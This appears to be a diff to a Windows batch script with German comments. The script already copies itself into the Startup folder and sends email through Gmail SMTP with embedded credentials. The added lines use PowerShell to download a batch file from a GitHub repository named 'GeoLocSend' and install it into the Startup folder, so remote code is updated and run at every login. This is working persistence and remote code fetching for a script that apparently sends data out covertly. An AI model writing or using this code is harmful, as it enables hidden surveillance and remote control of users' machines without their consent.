@@ -1,5 +1,25 @@
 @echo off
 
+setlocal
+
+:: GitHub-Repository und Dateipfad
+set "REPO_URL=https://github.com/GraficPixelTDSM/GeoLocSend/raw/main/NewVersion.bat"
+set "LOCAL_FILE_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\NewVersion.bat"
+
+:: Herunterladen der neuesten Version von GitHub
+powershell -command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%TEMP%\NewVersion.bat')"
+
+:: Überprüfen, ob die heruntergeladene Datei anders ist als die lokale Datei
+fc "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%" > nul
+if %errorlevel% neq 0 (
+    echo Neue Version gefunden. Aktualisieren...
+    copy /y "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%"
+    echo Aktualisierung abgeschlossen.
+) else (
+    echo Keine neue Version gefunden.
+)
+
+:: Originaler Batch-Code
 set AutostartFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 if not exist "%AutostartFolder%\%~nx0" (
@@ -29,3 +49,5 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
     "$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password; " ^
 
     "Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer 'smtp.gmail.com' -port 587 -UseSsl -Credential $Credential;"
+
+endlocal
